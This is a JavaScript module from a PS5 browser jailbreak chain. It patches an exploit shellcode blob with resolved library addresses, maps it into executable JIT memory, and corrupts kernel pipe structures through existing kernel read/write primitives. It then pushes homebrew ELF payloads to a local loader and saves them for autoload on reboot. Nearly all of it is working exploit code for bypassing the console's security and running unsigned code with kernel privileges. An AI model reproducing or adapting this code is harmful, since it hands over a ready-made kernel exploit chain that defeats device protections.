import { int64 } from "./utils/int64.js";

const O_NONBLOCK = 0x4;
const O_WRONLY_CREAT_TRUNC = 0x601;
const MODE_0777 = 0x1ff;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
const DT_DIR = 4;
const NOTIFY_SIZE = 0xc30;
const NOTIFY_MESSAGE = 0x2d;
const ETAHEN_DIR = "/data/etaHEN";
const ONIONHEN_DIR = "/data/OnionHEN";
const AUTOLOADER_DIR = "/data/ps5_autoloader";
const AUTOLOADER_APP = "/user/app/WKAL00001";
const AUTOLOADER_PARAM = "/user/app/WKAL00001/sce_sys/param.json";
const AUTOLOADER_UI_MARK = "/data/ps5_autoloader/.psh5jb_ui";
const AUTOLOADER_ELF = "webkit-autoloader-installer_v0.5.2.elf";
const AUTOLOAD_TXT = "OnionHEN.elf\n!8000\npldmgr_v0.5.2.elf\n";
const SAVED_TOAST = "Saved in WebKit Autoloader - reboot, then open that app";
const INSTALL_TOAST = "Leave the Autoloader page open until it finishes - do not reboot yet";

const DEFAULT_KEXP = "kexp_2026_05_25.bin";
const DEFAULT_ELFLDR = "elfldr-ps5-1360.elf";

const SHELLCODE = {
  size: 18912,
  resolverCalls: [
    [0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
    [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]],
  ],
  getpid: {
    at: 0x10f1,
    bytes: [
      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
      0xe8, 0x41, 0x2b, 0x00, 0x00,
    ],
    tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
    tailAt: 0x10fb,
    padFrom: 0x1101,
    padTo: 0x1106,
  },
  logCalls: [0x126d, 0x12ad, 0x3bc2],
  imports: {
    libkernel: {
      sceKernelSendNotificationRequest: 0x48b0,
      sysctlbyname: 0x48b8,
      pthread_create: 0x48c0,
      pthread_join: 0x48c8,
    },
    libc: {
      malloc: 0x48d0,
      free: 0x48d8,
      memcpy: 0x48e0,
      memset: 0x48e8,
      strcmp: 0x48f0,
      memcmp: 0x48f8,
      vsnprintf: 0x4900,
    },
  },
};

const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };

function readU32(bytes, offset) {
  return (bytes[offset] | (bytes[offset + 1] << 8) |
    (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function writeU64(bytes, offset, value) {
  let rest = BigInt(value) & 0xffffffffffffffffn;
  for (let i = 0; i < 8; i++) {
    bytes[offset + i] = Number(rest & 0xffn);
    rest >>= 8n;
  }
}

function matches(bytes, offset, expected) {
  return expected.every((byte, index) => bytes[offset + index] === byte);
}

function hex(value) {
  return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
}

function sysRv(value) {
  return value.low | 0;
}

function cstring(p, text) {
  const buf = p.malloc(text.length + 1, 1);
  p.writestr(buf, text);
  return buf;
}

function readCString(p, addr, max) {
  let name = "";
  const n = max > 0 ? max : 255;
  for (let i = 0; i < n; i++) {
    const c = p.read1(addr.add32(i)) & 0xff;
    if (c === 0) break;
    if (c < 0x20 || c > 0x7e) return "";
    name += String.fromCharCode(c);
  }
  return name;
}

function parseDirents(p, buf, n) {
  const walk = (reclenAt, typeAt, nameAt, minRec) => {
    const entries = [];
    for (let pos = 0; pos < n; ) {
      const reclen = p.read2(buf.add32(pos + reclenAt)) & 0xffff;
      if (reclen < minRec || reclen > n - pos) return null;
      const type = p.read1(buf.add32(pos + typeAt)) & 0xff;
      const name = readCString(p, buf.add32(pos + nameAt), reclen - nameAt);
      if (name && name !== "." && name !== "..")
        entries.push({ name, type });
      pos += reclen;
    }
    return entries;
  };
  const freebsd11 = walk(4, 6, 8, 8);
  if (freebsd11 && freebsd11.length) return freebsd11;
  const ino64 = walk(16, 18, 24, 24);
  if (ino64) return ino64;
  return freebsd11 || [];
}

export async function notify(p, chain, message) {
  const offset = window.SYMBOLS && window.SYMBOLS.libkernel
    && window.SYMBOLS.libkernel.sceKernelSendNotificationRequest;
  if (typeof offset !== "number" || !p.libKernelBase) return;
  try {
    const req = p.malloc(NOTIFY_SIZE, 1);
    for (let i = 0; i < NOTIFY_SIZE; i += 4) p.write4(req.add32(i), 0);
    p.writestr(req.add32(NOTIFY_MESSAGE), message);
    await chain.call(p.libKernelBase.add32(offset), 0, req, NOTIFY_SIZE, 0);
  } catch (_) {}
}

async function pathExists(p, chain, path) {
  return sysRv(await chain.syscall(SYS_ACCESS, cstring(p, path), 0)) === 0;
}

async function listDir(p, chain, dirPath) {
  const fd = sysRv(await chain.syscall(SYS_OPEN, cstring(p, dirPath), 0, 0));
  if (fd < 0) return [];
  const buf = p.malloc(0x1000, 1);
  const basep = p.malloc(8, 1);
  const entries = [];
  try {
    for (;;) {
      p.write8(basep, new int64(0, 0));
      const n = sysRv(await chain.syscall(SYS_GETDENTS, fd, buf, 0x1000, basep));
      if (n <= 0) break;
      entries.push.apply(entries, parseDirents(p, buf, n));
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
  return entries;
}

async function unlinkPath(p, chain, path) {
  if (chain.syscalls[SYS_CHFLAGS])
    await chain.syscall(SYS_CHFLAGS, cstring(p, path), 0);
  return sysRv(await chain.syscall(SYS_UNLINK, cstring(p, path)));
}

async function rmTree(p, chain, path, depth) {
  if (depth > 32) return;
  const entries = await listDir(p, chain, path);
  for (const { name, type } of entries) {
    const child = path.endsWith("/") ? path + name : path + "/" + name;
    if (type === DT_DIR) {
      await rmTree(p, chain, child, depth + 1);
      continue;
    }
    const un = await unlinkPath(p, chain, child);
    if (un !== 0)
      await rmTree(p, chain, child, depth + 1);
  }
  const rm = sysRv(await chain.syscall(SYS_RMDIR, cstring(p, path)));
  if (rm !== 0)
    await unlinkPath(p, chain, path);
}

export async function sweepEtaHEN(p, chain, log) {
  const say = typeof log === "function" ? log : () => {};
  try {
    const existed = await pathExists(p, chain, ETAHEN_DIR);
    const onionPresent = await pathExists(p, chain, ONIONHEN_DIR);
    if (!existed)
      return { existed: false, removed: false, onionPresent };

    await rmTree(p, chain, ETAHEN_DIR, 0);
    const removed = !(await pathExists(p, chain, ETAHEN_DIR));
    if (!removed) {
      say("left leftover /data/etaHEN — continuing jailbreak");
      await notify(p, chain, "left leftover /data/etaHEN");
    }
    return { existed: true, removed, onionPresent };
  } catch (error) {
    say("etaHEN cleanup skipped — continuing jailbreak");
    return { existed: false, removed: false, onionPresent: false, error };
  }
}

function resolveSymbols(p) {
  const tables = window.SYMBOLS || {};
  const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
  const resolved = {};

  for (const [group, imports] of Object.entries(SHELLCODE.imports)) {
    const base = bases[group];
    const offsets = tables[group];
    if (!base || (base.low === 0 && base.hi === 0))
      throw new Error("kexp: " + group + " base is unresolved");
    if (!offsets) throw new Error("kexp: " + group + " symbols are missing");

    const names = Object.keys(imports);
    if (group === "libkernel") names.push("getpid");
    const missing = names.filter((name) => typeof offsets[name] !== "number");
    if (missing.length)
      throw new Error("kexp: " + group + " is missing " + missing.join(", "));
    resolved[group] = { base, offsets };
  }
  return resolved;
}

async function fetchBinary(name) {
  if (window.payloadStore && typeof window.payloadStore.get === "function") {
    const cached = await window.payloadStore.get(name);
    if (cached && cached.length) return cached;
  }
  if (typeof window.loadBinary === "function") {
    const data = await window.loadBinary("payloads/" + name);
    if (window.payloadStore && typeof window.payloadStore.put === "function") {
      try { await window.payloadStore.put(name, data); } catch (_) {}
    }
    return data;
  }
  const response = await fetch("payloads/" + name);
  if (!response.ok) throw new Error("kexp: " + name + " returned HTTP " + response.status);
  return new Uint8Array(await response.arrayBuffer());
}

async function mapElf(name, p, chain) {
  const elf = await fetchBinary(name);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error("kexp: " + name + " is not an ELF");

  const size = (elf.length + 0x3fff) & ~0x3fff;
  const base = await chain.syscall(SYS_MMAP, 0, size, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
  if (base.low >>> 0 === 0xffffffff || base.low < 0x10000)
    throw new Error("kexp: " + name + " mmap failed");

  const dwords = elf.length & ~3;
  for (let offset = 0; offset < dwords; offset += 4) {
    p.write4(base.add32(offset), readU32(elf, offset));
    if (offset && (offset & 0x3ffff) === 0)
      await new Promise((resolve) => setTimeout(resolve, 0));
  }
  for (let offset = dwords; offset < elf.length; offset++)
    p.write1(base.add32(offset), elf[offset]);
  if (p.read4(base) >>> 0 !== 0x464c457f)
    throw new Error("kexp: " + name + " copy failed");

  return { base, size: elf.length };
}

async function connectToElfldr(p, chain) {
  const address = p.malloc(16);
  p.write8(address, new int64(0, 0));
  p.write8(address.add32(8), new int64(0, 0));
  p.write4(address, 0x3d230210); // AF_INET, port 9021
  p.write4(address.add32(4), 0x0100007f); // 127.0.0.1

  for (let attempt = 0; attempt < 40; attempt++) {
    const socket = await chain.syscall(SYS_SOCKET, 2, 1, 0);
    const fd = socket.low | 0;
    if (fd >= 0) {
      const connected = await chain.syscall(SYS_CONNECT, fd, address, 16);
      if ((connected.low >>> 0) === 0) return fd;
      await chain.syscall(SYS_CLOSE, fd);
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }

  throw new Error("elfldr is not listening on port 9021");
}

async function sendElf(name, payload, p, chain) {
  const fd = await connectToElfldr(p, chain);
  try {
    for (let offset = 0; offset < payload.size;) {
      const length = Math.min(0x40000, payload.size - offset);
      const written = (await chain.syscall(SYS_WRITE, fd, payload.base.add32(offset), length)).low | 0;
      if (written <= 0) throw new Error(name + " socket write failed");
      offset += written;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

async function sendOne(name, p, chain, log) {
  log("mapping " + name);
  const mapped = await mapElf(name, p, chain);
  log("sending " + name + " to elfldr :9021");
  await sendElf(name, mapped, p, chain);
  log(name + " sent");
  return mapped;
}

async function ensureDir(p, chain, path) {
  if (await pathExists(p, chain, path)) return true;
  const rv = sysRv(await chain.syscall(SYS_MKDIR, cstring(p, path), MODE_0777));
  if (rv === 0 || (await pathExists(p, chain, path))) return true;
  return false;
}

async function writeBuf(p, chain, path, buf, length) {
  const fd = sysRv(await chain.syscall(
    SYS_OPEN, cstring(p, path), O_WRONLY_CREAT_TRUNC, MODE_0777));
  if (fd < 0) throw new Error("open " + path + " failed (" + fd + ")");
  try {
    for (let offset = 0; offset < length; ) {
      const chunk = Math.min(0x40000, length - offset);
      const written = sysRv(await chain.syscall(SYS_WRITE, fd, buf.add32(offset), chunk));
      if (written <= 0) throw new Error("write " + path + " failed (" + written + ")");
      offset += written;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
}

async function writeTextFile(p, chain, path, text) {
  await writeBuf(p, chain, path, cstring(p, text), text.length);
}

async function autoloaderOnHomescreen(p, chain) {
  return (await pathExists(p, chain, AUTOLOADER_PARAM)) ||
    (await pathExists(p, chain, AUTOLOADER_APP));
}

async function saveAutoloadFiles(p, chain, log, mapped) {
  const say = typeof log === "function" ? log : () => {};
  if (!(await ensureDir(p, chain, AUTOLOADER_DIR))) {
    say("could not create /data/ps5_autoloader");
    return false;
  }
  if (mapped.onion) {
    say("saving OnionHEN.elf into WebKit Autoloader");
    await writeBuf(p, chain, AUTOLOADER_DIR + "/OnionHEN.elf", mapped.onion.base, mapped.onion.size);
  }
  if (mapped.pld) {
    say("saving pldmgr_v0.5.2.elf into WebKit Autoloader");
    await writeBuf(p, chain, AUTOLOADER_DIR + "/pldmgr_v0.5.2.elf", mapped.pld.base, mapped.pld.size);
  }
  await writeTextFile(p, chain, AUTOLOADER_DIR + "/autoload.txt", AUTOLOAD_TXT);
  say("saved jailbreak payloads to /data/ps5_autoloader");
  return true;
}

export async function loadOptionalPayloads(p, chain, log) {
  // OnionHEN is a full stack: bootstrapper → elfldr :9020 → util → kstuff → Toolbox.
  // Sending kstuff/shadowmount/etaHEN first makes OnionHEN refuse to start.
  log("preparing OnionHEN");
  const onion = await sendOne("OnionHEN.elf", p, chain, log);
  log("OnionHEN.elf sent — wait for util, kstuff, then Toolbox");

  const waitUntil = Date.now() + 8000;
  try {
    await saveAutoloadFiles(p, chain, log, { onion });
  } catch (error) {
    log("save to WebKit Autoloader skipped: " +
      (error && error.message ? error.message : String(error)));
  }
  const left = waitUntil - Date.now();
  if (left > 0) await new Promise((resolve) => setTimeout(resolve, left));

  log("preparing Payload Manager");
  const pld = await sendOne("pldmgr_v0.5.2.elf", p, chain, log);
  log("pldmgr_v0.5.2.elf sent — dashboard at http://PS5:8084");
  try {
    await saveAutoloadFiles(p, chain, log, { pld });
  } catch (error) {
    log("save Payload Manager skipped: " +
      (error && error.message ? error.message : String(error)));
  }

  if (await autoloaderOnHomescreen(p, chain)) {
    log(SAVED_TOAST);
    await notify(p, chain, SAVED_TOAST);
    return;
  }

  try {
    log("sending WebKit Autoloader installer with PSH5JB UI");
    await sendOne(AUTOLOADER_ELF, p, chain, log);
    await writeTextFile(p, chain, AUTOLOADER_UI_MARK, "psh5jb\n");
    log(INSTALL_TOAST);
    await notify(p, chain, INSTALL_TOAST);
  } catch (error) {
    log("Autoloader installer skipped: " +
      (error && error.message ? error.message : String(error)));
    log("done - press the PS button to go home");
    await notify(p, chain, "done - press the PS button to go home");
  }
}

function patchShellcode(blob, symbols) {
  if (blob.length !== SHELLCODE.size)
    throw new Error("kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length);
  if (SHELLCODE.resolverCalls.some(([offset, bytes]) => !matches(blob, offset, bytes)) ||
      !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
    throw new Error("kexp: shellcode signature does not match");

  for (const [offset] of SHELLCODE.resolverCalls)
    for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;

  const addressOf = (group, name) => {
    const { base, offsets } = symbols[group];
    return (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name]);
  };
  for (const [group, imports] of Object.entries(SHELLCODE.imports))
    for (const [name, offset] of Object.entries(imports))
      writeU64(blob, offset, addressOf(group, name));

  const { at, tail, tailAt, padFrom, padTo } = SHELLCODE.getpid;
  blob[at] = 0x48;
  blob[at + 1] = 0xb8;
  writeU64(blob, at + 2, addressOf("libkernel", "getpid"));
  tail.forEach((byte, index) => blob[tailAt + index] = byte);
  for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;

  for (const offset of SHELLCODE.logCalls)
    if (blob[offset] === 0xe8)
      for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
}

async function mapExecutable(blob, p, chain) {
  const length = (blob.length + 0x3fff) & ~0x3fff;
  const failed = (value) => value.low >>> 0 === 0xffffffff;
  const copyInto = (destination) => {
    const dwords = blob.length & ~3;
    for (let offset = 0; offset < dwords; offset += 4)
      p.write4(destination.add32(offset), readU32(blob, offset));
    for (let offset = dwords; offset < blob.length; offset++)
      p.write1(destination.add32(offset), blob[offset]);
    for (let offset = 0; offset < dwords; offset += 4)
      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
    return true;
  };

  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
  if (failed(execFd) || execFd.low >= 0x100000)
    throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");

  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
  if (failed(entry) || entry.low < 0x10000)
    throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");

  if (!copyInto(entry)) {
    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
    if (failed(writeFd) || writeFd.low >= 0x100000)
      throw new Error("kexp: writable jitshm alias failed");

    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
    if (failed(writable) || writable.low < 0x10000)
      throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
      throw new Error("kexp: shellcode copy failed");
    await chain.syscall(SYS_MUNMAP, writable, length);
  }
  return entry;
}

async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);
  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
  if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");

  const readFd = p.read4(fds) >>> 0;
  const writeFd = p.read4(fds.add32(4)) >>> 0;
  if (!readFd || !writeFd || readFd >= 0x100000 || writeFd >= 0x100000)
    throw new Error("kexp: invalid pipe fds " + readFd + "/" + writeFd);
  return { readFd, writeFd };
}

async function prepareShellcodePipes(krw, master, victim) {
  const table = await krw.read8(krw.procFdAddr);
  const pipeOf = async (fd) => {
    const file = await krw.read8(table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride));
    return krw.read8(file.add32(FD_ENTRY.data));
  };

  const masterPipe = await pipeOf(master.readFd);
  const victimPipe = await pipeOf(victim.readFd);
  await krw.write4(masterPipe.add32(PIPE.count), 0);
  await krw.write4(masterPipe.add32(PIPE.in), 0);
  await krw.write4(masterPipe.add32(PIPE.out), 0);
  await krw.write4(masterPipe.add32(PIPE.size), PIPE.defaultSize);
  await krw.write8(masterPipe.add32(PIPE.buffer), victimPipe);

  const readBack = await krw.read8(masterPipe.add32(PIPE.buffer));
  if (readBack.low !== victimPipe.low || readBack.hi !== victimPipe.hi)
    throw new Error("kexp: pipe bootstrap failed");
}

async function spawnAndJoin(entry, args, symbols, p, chain) {
  const { base, offsets } = symbols.libkernel;
  const create = offsets.pthread_create_name_np === undefined
    ? offsets.pthread_create
    : offsets.pthread_create_name_np;
  const handle = p.malloc(8);
  const result = p.malloc(8);
  p.write8(handle, 0);
  p.write8(result, 0);

  const created = await chain.call(base.add32(create), handle, new int64(0, 0), entry, args, p.stringify("payload"));
  if (created.low >>> 0 !== 0)
    throw new Error("kexp: pthread_create returned " + hex(created));

  const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
  return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
}

export async function runKexp(krw, p, chain, log) {
  const say = typeof log === "function" ? log : () => {};
  const allprocRva = window.KRW && window.KRW.allproc;
  if (!krw || !krw.ktextBase || !krw.procFdAddr)
    throw new Error("kexp: kernel R/W is incomplete");
  if (typeof allprocRva !== "number")
    throw new Error("kexp: allproc is missing for this firmware");

  const allproc = krw.ktextBase.add32(allprocRva);
  if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
    throw new Error("kexp: invalid allproc address " + hex(allproc));
  const symbols = resolveSymbols(p);

  const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain);

  const blob = await fetchBinary(DEFAULT_KEXP);
  patchShellcode(blob, symbols);
  const entry = await mapExecutable(blob, p, chain);

  const master = await makePipePair(p, chain);
  const victim = await makePipePair(p, chain);
  await prepareShellcodePipes(krw, master, victim);

  const args = p.malloc(0x28);
  for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
  p.write4(args.add32(0x00), master.readFd);
  p.write4(args.add32(0x04), master.writeFd);
  p.write4(args.add32(0x08), victim.readFd);
  p.write4(args.add32(0x0c), victim.writeFd);
  p.write8(args.add32(0x10), allproc);
  p.write8(args.add32(0x18), elfldr.base);
  p.write8(args.add32(0x20), elfldr.size);

  const result = await spawnAndJoin(entry, args, symbols, p, chain);
  if (result.joinResult !== 0)
    throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
  say("elfldr returned " + hex(result.shellcodeResult));
  return true;
}